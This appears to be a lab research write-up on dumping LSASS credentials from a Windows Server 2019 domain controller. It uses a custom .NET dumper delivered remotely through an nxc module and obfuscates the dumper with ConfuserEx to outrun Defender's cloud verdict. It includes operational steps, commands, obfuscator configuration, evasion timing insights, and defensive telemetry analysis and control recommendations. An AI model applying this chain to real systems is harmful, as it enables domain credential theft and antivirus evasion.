# Vector — Remote LSASS Credential Access via Custom Dumper, nxc Integration, and .NET Obfuscation

**Target:** Windows Server 2019 Standard Evaluation (Build 17763, KB5087061) — Primary Domain Controller  
**Role:** lab2019.local DC — WIN-JOCP945SK51  
**Defender signatures:** AV 1.451.93.0 / Engine 1.1.26040.8 (current as of 25 May 2026)  
**Context:** Assumed breach — valid Domain Administrator credentials in hand  
**Methodology:** Operational assumption analysis — documenting where defensive stack assumptions exceed their actual guarantees

---

## Research Question

Given assumed breach on a domain controller, what operational cost exists between privileged execution and credential extraction, and what telemetry does the defensive stack actually produce?

This is not a question about whether Defender can be evaded. It is a question about where protection timing diverges from protection assumptions — and what an attacker with DA credentials observes in practice against a current-signature, default-configuration DC.

---

## Background

The binary at the center of this research is a custom .NET LSASS dumper — no `MiniDumpWriteDump`, no `dbghelp.dll`. It constructs a valid minidump sequentially in memory using direct NT API calls: `NtOpenProcess`, `NtQueryVirtualMemory`, `NtReadVirtualMemory`, and a PEB walk for the module list. The result is a structurally valid `.dmp` parseable by pypykatz and KvcForensic.

The original version sent the dump over TCP to a listener. This research replaces that transport with a local file write, integrates the binary into an nxc module for fully remote execution, and tests the result against a live DC with current Defender signatures.

---

## The Binary — curpipe

The dumper operates as follows:

1. Enables `SeDebugPrivilege` via `NtAdjustPrivilegesToken`
2. Locates lsass by name via `Process.GetProcessesByName`
3. Opens a handle via `NtOpenProcess` with `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ`
4. Walks the PEB via `NtQueryInformationProcess` to enumerate loaded modules
5. Walks committed memory regions via `NtQueryVirtualMemory`, skipping `PAGE_NOACCESS` and `PAGE_GUARD`
6. Reads each region via `NtReadVirtualMemory`
7. Constructs a minidump in memory: `SystemInfoStream`, `ModuleListStream`, `Memory64ListStream`
8. Writes the result to a path provided via `args[0]`

The PEB walk requires a correctly sized buffer for `NtQueryInformationProcess`. An initial build used a hardcoded 48-byte buffer which returned `0xC0000004` (`STATUS_INFO_LENGTH_MISMATCH`) on this target, producing a skeleton dump with no module entries and only 2 memory regions. The fix:

```csharp
IntPtr pbiPtr = Marshal.AllocHGlobal(48);
uint retLen;
uint status = NtQueryInformationProcessRaw(hProcess, 0, pbiPtr, 48, out retLen);
if (status == 0xC0000004 && retLen > 48)
{
    Marshal.FreeHGlobal(pbiPtr);
    pbiPtr = Marshal.AllocHGlobal((int)retLen);
    status = NtQueryInformationProcessRaw(hProcess, 0, pbiPtr, retLen, out retLen);
}
```

With the fix, the binary produces a full dump:

```
PS C:\Windows\Temp> .\curnxc1.exe
[*] CurioPipeRemote - sequential minidump to disk
[*] Output: C:\Windows\Temp\lsass.dmp
[+] SeDebugPrivilege enabled
[+] OS: 10.0 build 17763
[+] lsass PID: 652
[+] lsass handle: 0x736
[+] PEB: 0x568900493312
[+] Modules found: 129
[*] Walking memory regions...
[+] Regions: 1008  Bytes: 147,116,032  Walk: 73ms
[*] Building minidump...
[+] Built: 147,155,080 bytes in 218ms
[*] Writing to C:\Windows\Temp\lsass.dmp...
[+] Written 147,155,080 bytes in 144ms
[+] Total: 435ms
[+] Done
```

129 modules, 147MB, 435ms total. pypykatz parses clean:

```
FILE: ======== testdump.dmp =======
== LogonSession ==
authentication_id 5015544 (4c87f8)
session_id 1
username Administrator
domainname LAB2019
logon_server WIN-JOCP945SK51
        == MSV ==
                Username: Administrator
                Domain: LAB2019
                LM: NA
                NT: 3c02b6b6fb6b3b17<redacted>
                SHA1: af61169243da7612a6<redacted>
        == Kerberos ==
                Username: Administrator
                Domain: LAB2019.LOCAL
                AES256 Key: e481d8013b3cde25<redacted>
```

---

## nxc Integration

The goal: deliver and execute the binary entirely remotely via nxc, pull the dump back to Kali, parse in place. No interactive session on the target beyond the binary touching disk.

The module (`curpipe.py`) does four things:

1. SMB upload via `put_file_single` to `C:\ProgramData\`
2. Remote execution via mmcexec (DCOM/MMC20 Application)
3. SMB download via `get_file_single`
4. Cleanup

The module follows standard nxc structure with a few implementation details that required iteration:

- nxc 1.4.0 requires `category` to be set using the `CATEGORY` enum imported from `nxc.helpers.misc` (`CATEGORY.CREDENTIAL_DUMPING`), not a plain string — the loader validates against the enum and rejects anything else
- `put_file_single` and `get_file_single` take share-relative paths (`\ProgramData\curnxc.exe`), not full UNC or `C:\` paths
- `execute()` takes full `C:\` paths
- `get_output=False` suppresses the wmiexec output redirect file (`1> \Windows\Temp\<random> 2>&1`), which is itself a detection surface (`SuspRemoteCmdCommand.H`)
- A sleep between execute and download is necessary — the binary completes in 2-3 seconds but the module proceeds to download immediately otherwise, finding no dump file
- Cleanup runs as a second `execute()` call after download completes

The `on_admin_login` hook fires automatically per host, making the module usable across multiple targets in a single nxc run.

---

## Defender Detection Surface — Unobfuscated Binary

Before obfuscation, three independent signatures fired:

**1. `Trojan:Win32/Bearfoos.A!ml` / `Bearfoos.B!ml` (ThreatID 2147731250 / 2147731849)**

```
Name: Trojan:Win32/Bearfoos.B!ml
Path: file:_C:\ProgramData\curnxc.exe
Detection Origin: Local machine
Detection Type: FastPath
Detection Source: Real-Time Protection
Process Name: System
Action: Quarantine
Security intelligence Version: AV: 1.451.93.0
Engine Version: AM: 1.1.26040.8
```

Static byte signature on the binary, firing on SMB write before any execution. `DetectionType: FastPath` indicates a cloud-assisted ML verdict. `Process: System` confirms this is the on-write scan, not behavioral detection.

**2. `VirTool:Win32/SuspRemoteCmdCommand.H` (ThreatID 2147851517)**

```
Path: CmdLine:_C:\Windows\System32\cmd.exe /Q /c C:\Windows\Temp\curpipe.exe
      C:\Windows\Temp\lsass.dmp 1> \Windows\Temp\VJmvUt 2>&1
Detection Type: Concrete
```

The wmiexec/atexec output redirect pattern. The `1> \Windows\Temp\<random> 2>&1` suffix is the signature anchor. Resolved by switching to mmcexec with `get_output=False`.

**3. `VirTool:Win32/SuspRemoteCmdCommand.K` (ThreatID 2147922311)**

```
Path: CmdLine:_C:\Windows\System32\cmd.exe /F:ON /Q /C powershell -EncodedCommand ...
Detection Type: Concrete
```

The `-EncodedCommand` + mmcexec wrapper. Fired during an earlier attempt to deliver the binary via PowerShell base64 drop. Resolved by reverting to direct SMB upload.

---

## ConfuserEx Obfuscation

ConfuserEx is a .NET obfuscator originally designed for IP protection, not AV evasion. Applied here with three protections:

```xml
<project baseDir="...\bin\x64\Release" outputDir="C:\Tools\obf"
         xmlns="http://confuser.codeplex.com">
  <rule pattern="true" inherit="false">
    <protection id="rename" />
    <protection id="ctrl flow" />
    <protection id="constants" />
  </rule>
  <module path="curnxc1.exe" />
</project>
```

Run via:

```
C:\Tools\ConfuserEx\Confuser.CLI.exe C:\Tools\confuser.crproj

 [INFO] Confuser.Core 1.6.0+447341964f
 [INFO] Loading 'curnxc1.exe'...
[DEBUG] Executing 'Renaming' phase...
[DEBUG] Executing 'Control flow mangling' phase...
[DEBUG] Executing 'Constants encoding' phase...
 [INFO] Writing module 'curnxc1.exe'...
 [INFO] Done.
Finished at 16:59, 0:00 elapsed.
```

The obfuscated binary (`53,248` bytes vs `12,800` bytes unobfuscated — ConfuserEx injects a runtime stub) was uploaded to the target with Defender active.

ConfuserEx's output is non-deterministic — each run produces a different binary with a different hash. The practical implication: each recompile resets the cloud reputation clock. A binary that has been classified and quarantined can be rerun through ConfuserEx and reintroduce a fresh execution window. This is not a stable evasion; it is a repeatable reset of the first-seen window, bounded by how quickly Microsoft's backend processes submitted samples and propagates updated signatures.

---

## Results — Obfuscated Binary Against Live DC

Successive runs with Defender active, current signatures, post-reboot cold state:

```
➜  ~ nxc smb 192.168.1.251 -u administrator -p '<password redacted>' \
    -M curpipe -o BIN=/home/kali/curnxc1.exe OUTDIR=/tmp/dumps \
    --exec-method mmcexec

SMB  192.168.1.251  445  WIN-JOCP945SK51  [+] lab2019.local\administrator:<password redacted> (Pwn3d!)
SMB  192.168.1.251  445  WIN-JOCP945SK51  [*] Copying /home/kali/curnxc1.exe to \ProgramData\curnxc.exe
SMB  192.168.1.251  445  WIN-JOCP945SK51  [+] Created file /home/kali/curnxc1.exe on \\C$\\ProgramData\curnxc.exe
SMB  192.168.1.251  445  WIN-JOCP945SK51  [+] File "\ProgramData\lsass.dmp" was downloaded to "/tmp/dumps/192.168.1.251.dmp"
CURPIPE  192.168.1.251  445  WIN-JOCP945SK51  [+] Dump saved: /tmp/dumps/192.168.1.251.dmp (220,827,920 bytes)
```

220MB dump on Kali. pypykatz output:

```
FILE: ======== /tmp/dumps/192.168.1.251.dmp =======
== LogonSession ==
authentication_id 383940 (5dbc4)
session_id 1
username Administrator
domainname LAB2019
logon_server WIN-JOCP945SK51
        == MSV ==
                Username: Administrator
                Domain: LAB2019
                LM: NA
                NT: 3c02b6b6fb6b3b17<redacted>
                SHA1: af61169243da7612a6<redacted>
        == Kerberos ==
                Username: Administrator
                Domain: LAB2019.LOCAL
                AES256 Key: e481d8013b3cde25<redacted>
```

The chain ran successfully across multiple successive executions with the same binary, including post-reboot cold Defender state.

---

## The Detection Model — What Actually Happens

### On-write behavior

Defender intercepts the SMB write and holds the connection open while querying the cloud. With `SubmitSamplesConsent: 0` on this host ("always prompt"), the verdict is gated on user response — a non-default configuration. Once dismissed or timed out, the write completes. In a standard installation where submission is automatic, this prompt does not appear and the cloud verdict arrives without user interaction.

```
PS> Get-MpPreference | Select SubmitSamplesConsent, MpCloudBlockLevel, CloudBlockThreshold

SubmitSamplesConsent  MpCloudBlockLevel  CloudBlockThreshold
--------------------  -----------------  -------------------
                   0
```

No `MpCloudBlockLevel` configured — under default settings, behavior is consistent with an allow-first, classify-after pattern. The binary lands.

### Execution window

The binary executes in approximately 2-3 seconds. In this lab configuration, cloud reputation latency exceeded binary runtime. By the time Defender acts, the dump is written and the SMB download has begun. Cloud timing varies by region, backend load, sample prevalence, and SmartScreen/ISG state — this observation should not be generalized beyond the conditions documented here.

On cold state (post-reboot), the Defender alert fires during the write — visible on the target — but the process completes before quarantine executes. The dump lands on Kali regardless.

### Subsequent runs

After the first cloud lookup resolves to "unknown/clean" (not blocked), the local cache retains that verdict. Subsequent runs with the same hash complete without a cloud hold. No alert fires on repeated execution.

This is not a permanent evasion — it is a verdict cache artifact. The binary will eventually be classified if samples accumulate in the Microsoft corpus. `SubmitSamplesConsent: 0` in this lab suppresses automatic submission entirely, which is a non-default configuration — standard Defender installations default to `1` (send safe samples automatically) or higher. In a default or hardened enterprise configuration, samples submit without prompting and the cloud verdict arrives faster, narrowing the window compared to what was observed here.

When the window does close — when a hash is classified and quarantined — a fresh ConfuserEx compile resets it. Each obfuscation pass produces a new hash, a new first-seen event, and a new execution window. The cost of resetting is one recompile.

---

## Windows Event Telemetry

### EID 4663 — Process memory read (Kernel Object auditing)

Every run is logged:

```
TimeCreated : 5/25/2026 7:47:59 AM

Object Type:    Process
Object Name:    \Device\HarddiskVolume4\Windows\System32\lsass.exe
Handle ID:      0x48

Process Name:   C:\ProgramData\curnxc.exe
Accesses:       Read from process memory
Access Mask:    0x10
Subject:        Administrator / LAB2019
```

Three separate runs visible in the log (7:21, 7:33, 7:37, 7:47). Each is a clean forensic record of `PROCESS_VM_READ` against lsass.

Notably, MsMpEng.exe produces identical events:

```
TimeCreated : 5/25/2026 7:47:31 AM

Object Name:    \Device\HarddiskVolume4\Windows\System32\lsass.exe
Process Name:   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MsMpEng.exe
Accesses:       Read from process memory
Access Mask:    0x10
```

The log cannot distinguish attacker from defender on access pattern alone. Process name is the only differentiator. A renamed or hollowed binary changes that signal.

### EID 4656 — Handle request (absent)

Despite `Handle Manipulation` auditing enabled on both success and failure:

```
PS> auditpol /get /subcategory:"Handle Manipulation"
  Handle Manipulation    Success and Failure

PS> auditpol /get /subcategory:"Kernel Object"
  Kernel Object          Success and Failure
```

No EID 4656 was observed for the `NtOpenProcess` call in this lab, despite Handle Manipulation auditing being enabled on both success and failure. Comparative testing against a conventional `OpenProcess` implementation would be needed to isolate whether this reflects a causal difference in the syscall path, a SACL configuration artifact, or an interaction with LSASS protection state. The observation stands: memory access (4663) is logged; handle acquisition (4656) was not. That visibility gap warrants further controlled investigation.

### Defender EID 1116/1117

```
TimeCreated : 5/25/2026 7:47:59 AM
Id          : 1116

Name: Trojan:Win32/Bearfoos.B!ml
ID: 2147731849
Path: file:_C:\ProgramData\curnxc.exe
Detection Type: FastPath
Detection Source: Real-Time Protection
Security intelligence Version: AV: 1.451.93.0
Engine Version: AM: 1.1.26040.8
```

EID 1116 (detection) and 1117 (quarantine) fire post-execution. The binary has already completed and the dump is already in transit by the time the quarantine action executes.

---

## Summary of Detection Surfaces

| Surface | Event | Fires | Prevents execution |
|---|---|---|---|
| Binary on-write (unobfuscated) | EID 1116 `FastPath` | Yes | Yes — quarantine before execution |
| Binary on-write (ConfuserEx) | EID 1116 `FastPath` | Yes (first write) | No — cloud verdict latency exceeds execution time |
| NtOpenProcess handle request | EID 4656 | **No (this lab)** | N/A — absent; causal mechanism not fully isolated |
| PROCESS_VM_READ against lsass | EID 4663 | Yes | No — logged only, no blocking |
| mmcexec cmdline pattern | EID 1116 `SuspRemoteCmdCommand` | Yes | No — fires after execution completes |
| wmiexec output redirect | EID 1116 `SuspRemoteCmdCommand.H` | Yes | Yes — blocks output retrieval |

---

## Finding Classes

**Structurally difficult to distinguish:** EID 4663 access semantics are identical for MsMpEng.exe and attacker tooling. Defender must read lsass memory to scan it. Within the base 4663 event, the immediately visible differentiator is process identity (image path/name), which is comparatively weak and attacker-influenceable. Telemetry enrichment (signer, integrity level, call origin, ETW context) could improve signal, but the base event does not provide it.

**Architectural tradeoff, configurable:** In this lab configuration, cloud reputation latency exceeded binary runtime under default `MpCloudBlockLevel`. This is consistent with an optimistic write model — allow write, query cloud asynchronously — as observed under default settings. Elevated `MpCloudBlockLevel` closes this by holding the write synchronously. The gap exists in default configurations; it is not inherent to the cloud model.

**Observation requiring further investigation:** No EID 4656 was generated for the `NtOpenProcess` path in this environment despite Handle Manipulation auditing being active. Whether this is a syscall path artifact, a SACL condition, or a known audit gap needs comparative testing to establish cleanly.

---

## Control Recommendation

Within Defender AV alone, the strongest mitigating control observed in this configuration was elevated cloud blocking:

```powershell
Set-MpPreference -MpCloudBlockLevel 4  # ZeroTolerance
Set-MpPreference -CloudBlockThreshold 50
Set-MpPreference -SubmitSamplesConsent 2  # SendAllSamples
```

This holds the SMB write open until a cloud verdict returns rather than proceeding optimistically. Combined with `SubmitSamplesConsent: 2`, unknown binaries are submitted and classified before execution is permitted. The tradeoff is write latency on first encounter of any unknown binary — in a DC context, that tradeoff is reasonable.

This recommendation addresses the first-seen execution window documented here. It does not materially change post-compromise risk once tooling is reputation-established, allow-listed, or the hash has been seen and cleared by the cloud — as the repeated-run results in this paper demonstrate.

This addresses the execution window observed here. It does not substitute for broader controls — application allow-listing (WDAC, AppLocker), tiered admin models, Defender for Endpoint behavioral detections, and credential guard all apply at different layers and were outside the scope of this test.

---

## Scope and Validity Constraints

Findings should be interpreted as behavioral observations under these specific conditions, not universal guarantees:

- Single-host lab — Windows Server 2019 Evaluation Build 17763
- Primary Domain Controller role
- Defender AV only — no enterprise EDR stack, no Defender for Endpoint
- Default cloud policy except where explicitly stated
- DA credentials assumed — no lateral movement or privilege escalation tested
- No WDAC or AppLocker in place
- No Credential Guard or PPL enabled
- Evaluation build — not a production image
- `SubmitSamplesConsent: 0` on this host — automatic sample submission disabled, replaced by user prompt. This is non-default; standard Defender installations default to `1` (safe samples auto-submitted). This extended the verdict cache window beyond what a default or enterprise-managed configuration would exhibit.
- Default Defender configuration; Tamper Protection at system default; no ASR rule tuning beyond documented settings

---

*Target: Windows Server 2019 Build 17763 — lab2019.local PDC*  
*Defender AV: 1.451.93.0 / Engine: 1.1.26040.8*  
*Test date: 25 May 2026*  
*Methodology: Operational assumption analysis — trust assumptions as attack surfaces*

SCREENSHOTS:

<img width="1910" height="1051" alt="attack" src="https://github.com/user-attachments/assets/f0d89074-16fa-411c-b1fb-ae612c3d303c" />

<img width="1910" height="1051" alt="confuser" src="https://github.com/user-attachments/assets/0f2ef5b7-4449-490a-83a4-5db6c791c107" />

<img width="1902" height="1026" alt="curnxcwineid" src="https://github.com/user-attachments/assets/0b29b7fa-7250-4dcc-a04f-a2efe1fcd9f7" />

<img width="1291" height="994" alt="defender1" src="https://github.com/user-attachments/assets/788f8562-d23f-4d22-85cc-cba44a7213d1" />




*Target: Windows Server 2019 Build 17763 — lab2019.local PDC*  
*Defender AV: 1.451.93.0 / Engine: 1.1.26040.8*  
*Test date: 25 May 2026*  
*Methodology: Operational assumption analysis — trust assumptions as attack surfaces*
